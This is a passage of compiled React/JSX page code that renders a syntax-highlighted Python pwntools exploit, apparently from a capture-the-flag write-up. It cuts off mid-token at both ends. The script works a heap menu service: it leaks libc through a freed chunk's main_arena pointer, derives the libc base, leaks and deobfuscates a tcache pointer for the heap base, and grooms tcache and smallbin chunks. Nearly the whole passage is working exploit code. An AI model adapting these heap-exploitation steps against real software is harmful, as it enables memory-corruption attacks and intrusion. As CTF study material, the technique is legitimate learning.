val\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"main\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"global\"}),` heap\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"alloc\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"ALLOCATING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"1\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"size: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"content: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"FREEING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"2\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"SHOWING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"3\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvline\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Make two large chunks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Free the first one so bk = main_arena in libc\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    resp \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# parse the libc address in little-endian\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use offsets found in gdb to compute libc base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10419ce0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10200000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Libc Leak: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Grab some blocks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Place them into the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#This printed out a heap address\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Parse, deobfuscate, and set heap base.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" deobfuscate\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# seccomp actually alloc'd over a page of memory,\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# so base was -0x1000 from what I got.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1000\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Heap Base: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Cleaning tcaches + smallbins\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x60\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x80\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token 